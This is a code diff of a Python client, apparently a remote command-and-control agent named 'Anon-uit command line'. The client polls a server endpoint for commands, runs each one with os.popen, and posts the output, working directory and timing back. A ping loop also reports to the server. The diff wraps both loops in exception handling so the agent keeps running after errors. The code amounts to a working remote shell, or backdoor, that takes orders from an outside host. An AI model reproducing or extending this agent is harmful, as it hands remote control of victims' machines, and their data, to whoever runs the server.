@@ -43,33 +43,36 @@ def receiver():
 def commands():
     print('Anon-uit command line [Version 0.0.1]/Starting command listerner...')
     while True:
-        content = {'name': name, 'uid': uid}
-        command = requests.get(f'{endpoint_1}read_command', json=content)
-        command = dict(command.json())
-        received = str(datetime.now())
-        if command['new']:
-            try:
-                received = datetime.now()
-                time_start = time.time()
-                for c in command['command']:
-                    sender = c['target']
-                    command = c['command']
-                    print(f'Anon-uit command line [Version 0.0.1]/{sender}: {command}')
-                    print(f'executing {command}..')
-                    cmm = os.popen(command)
-                    cmm = cmm.read()
-                    finish = time.time() - time_start
-                    print('finish')
-                    content = {'response': cmm, 'client': uid, 'time_received': str(received),
-                               'exec_duration': str(finish), 'directory': str(os.getcwd())}
+        try:
+            content = {'name': name, 'uid': uid}
+            command = requests.get(f'{endpoint_1}read_command', json=content)
+            command = dict(command.json())
+            received = str(datetime.now())
+            if command['new']:
+                try:
+                    received = datetime.now()
+                    time_start = time.time()
+                    for c in command['command']:
+                        sender = c['target']
+                        command = c['command']
+                        print(f'Anon-uit command line [Version 0.0.1]/{sender}: {command}')
+                        print(f'executing {command}..')
+                        cmm = os.popen(command)
+                        cmm = cmm.read()
+                        finish = time.time() - time_start
+                        print('finish')
+                        content = {'response': cmm, 'client': uid, 'time_received': str(received),
+                                   'exec_duration': str(finish), 'directory': str(os.getcwd())}
+                        sender = requests.post(f'{endpoint_1}command_feedback', json=content)
+                        print(sender)
+                except Exception as e:
+                    print(e)
+                    content = {'response': 'Error while trying to execute command', 'client': uid,
+                               'time_received': str(received), 'exec_duration': 'None'}
                     sender = requests.post(f'{endpoint_1}command_feedback', json=content)
                     print(sender)
-            except Exception as e:
-                print(e)
-                content = {'response': 'Error while trying to execute command', 'client': uid, 'time_received': str(received), 'exec_duration': 'None'}
-                sender = requests.post(f'{endpoint_1}command_feedback', json=content)
-                print(sender)
-
+        except Exception as e:
+            print(e)
 
 
 def scripts():
@@ -86,7 +89,11 @@ def scripts():
 def ping():
     print('Anon-uit command line [Version 0.0.1]/Starting pinger...')
     while True:
-        content = {'uid': uid}
-        requests.get(f'{endpoint_1}ping', json=content)
+        try:
+            content = {'uid': uid}
+            requests.get(f'{endpoint_1}ping', json=content)
+        except Exception as e:
+            print(e)
+
 
 login()
